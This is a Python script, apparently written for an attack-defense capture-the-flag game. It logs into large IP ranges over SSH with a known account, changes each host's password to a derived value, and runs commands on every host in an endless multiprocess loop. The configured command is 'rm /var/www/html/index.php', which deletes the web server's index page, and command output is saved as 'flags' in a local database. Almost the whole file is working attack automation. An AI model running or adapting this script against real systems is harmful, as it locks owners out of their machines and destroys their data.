import paramiko
import multiprocessing
#import asyncio
import hashlib
import time
import os


import sqlite3
import datetime


CRAETE_TABLE_SQL = 'CREATE TABLE if not exists  csrf_flag ("id" INTEGER PRIMARY KEY AUTOINCREMENT  NOT NULL  UNIQUE , "csrf" VARCHAR UNIQUE,"ip" VARCHAR, "flag" VARCHAR UNIQUE, "insert_time" VARCHAR);'


def module_path():
    """
    This will get us the program's directory
    """
    return os.path.dirname(os.path.realpath(__file__))


def CreateTable(sql):
    local_file_path = module_path()
    conn = sqlite3.connect(os.path.join(local_file_path, "shell.sqlite"))
    create_sql = sql
    try:
        conn.execute(create_sql)
    except Exception as e:
        pass
        # print(e)


def InsertData(sql):
    local_file_path = module_path()
    conn = sqlite3.connect(os.path.join(local_file_path, "shell.sqlite"))
    try:
        cur = conn.cursor()
        cur.execute(sql)
        conn.commit()
    except Exception as e:
        pass
        # print(sql)
        # print(e)

class SSH:

    def __init__(self, host, port, user, passwd):
        self.host = host
        self.port = int(port)
        self.user = user
        self.passwd = passwd
        self.ssh = None

    def startup(self):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(self.host, self.port, self.user, self.passwd)
            t = paramiko.Transport((self.host, self.port))
            t.connect(username=self.user, password=self.passwd)
            self.ssh = ssh
            # print("[+] Connect successfully")
            return True
        except BaseException as e:
            # print("[-] Connect ERROR!! {}".format(e))
            return False

    def command_exec(self, command):
        try:
            std_in, std_out, std_err = self.ssh.exec_command(command)
            out = std_out.read()
            err = std_err.read()
            if out != b'':
                print(out.decode().rstrip("\n"))
                return out.decode().rstrip("\n")
            if err != b'':
                print(err.decode().rstrip("\n"))
        except BaseException as e:
            print("[-] Could not exec command! {}".format(e))
        self.ssh.close()
        return 0

    def change_passwd(self, ip, passwd, new_password):
        try:
            command = "passwd %s" %(self.user)
            stdin, stdout, stderr = self.ssh.exec_command(command)
            # stdin.write(new_password + '\n' + new_password + '\n')
            stdin.write(passwd + '\n' + new_password + '\n' + new_password + '\n')
            out, err = stdout.read(), stderr.read()
            successful = 'password updated successfully'
            if successful in str(err):
                print(ip + " successfully!")
            else:
                # print("[-] change {} passwd failed! {}".format(ip, str(err)))
                self.ssh.close()
        except BaseException as e:
            print("[-] Could not exec command! {}".format(e))
        return 0


def md5(s):
    m = hashlib.md5()
    m.update(s.encode())
    return m.hexdigest()


def gen_passwd(ip):
    passwd = md5("jspi" + str(ip) + "nealwe_NEALWE")
    return passwd

def ip_list(x):
    ipList = []
    iplist = x.split('.')
    if '-' in x:
        for i in iplist:
            d = i
            if '-' in d:
                p = iplist.index(d)
                l = d.split('-')
                m = int(l[0])
                n = int(l[1])
        for j in range(m, n + 1):
            iplist[p] = str(j)
            ip = '.'.join(iplist)
            ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    else:
        ip = '.'.join(iplist)
        ipList.append(ip)
        ipList = sorted(set(ipList), key=ipList.index)
    return ipList


def change_passwd(user, ip, port, passwd):
    new_passwd = gen_passwd(ip)
    try:
        a = SSH(ip, port, user, passwd)
        if a.startup():
            a.change_passwd(ip, passwd, new_passwd)
            # a.command_exec("killall -u {}".format(user))
        else:
            # print("[-] change {} passwd failed! ".format(ip))
            pass
    except BaseException as e:
        # print("[-] change {} passwd failed! {}".format(ip, e))
        pass
    return 0


def md5_py3(str_a):
    '''
    python3
    :param str_a:
    :return:
    '''
    import hashlib
    # 创建md5对象
    m = hashlib.md5()
    # Tips
    # 此处必须encode
    # 若写法为m.update(str)  报错为： Unicode-objects must be encoded before hashing
    # 因为python3里默认的str是unicode
    # 或者 b = bytes(str, encoding='utf-8')，作用相同，都是encode为bytes
    b = str(str_a)
    m.update(b.encode("utf8"))
    return m.hexdigest()

def run_cmd(user, ip, port, cmd):
    new_passwd = gen_passwd(ip)
    try:
        a = SSH(ip, port, user, new_passwd)
        if a.startup():
            insert_time = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            csrf = md5_py3(insert_time)
            flag = a.command_exec(cmd)
            # print(flag)
            INSERT_DATA = """INSERT INTO "main"."csrf_flag" ("csrf", "flag", "insert_time", "ip") VALUES ('{0}', '{1}', '{2}', '{3}');"""
            InsertData(INSERT_DATA.format(csrf, flag, insert_time, ip))
            print(f"send to {ip}.....")
        else:
            # print("[-] change {} passwd failed! ".format(ip))
            pass
    except BaseException as e:
        # print("[-] change {} passwd failed! {}".format(ip, e))
        pass
    return 0


def change_passwd_back(user, ip, port, passwd):
    new_passwd = gen_passwd(ip)
    try:
        a = SSH(ip, port, user, new_passwd)
        if a.startup():
            a.change_passwd(ip, new_passwd, passwd)
            # a.command_exec("killall -u {}".format(user))
        else:
            # print("[-] change {} passwd failed! ".format(ip))
            pass
    except BaseException as e:
        # print("[-] change {} passwd failed! {}".format(ip, e))
        pass
    return 0

ips = ip_list("4.4.1-83.101") + ip_list("4.4.1-83.100")
ports = ["22"]
user = "testu"
cmd = "rm /var/www/html/index.php"


while True:
    for port in ports:
        for ip in ips:
            t = multiprocessing.Process(target=run_cmd, args=(user, ip, port, cmd,))
            t.start()
        t.join()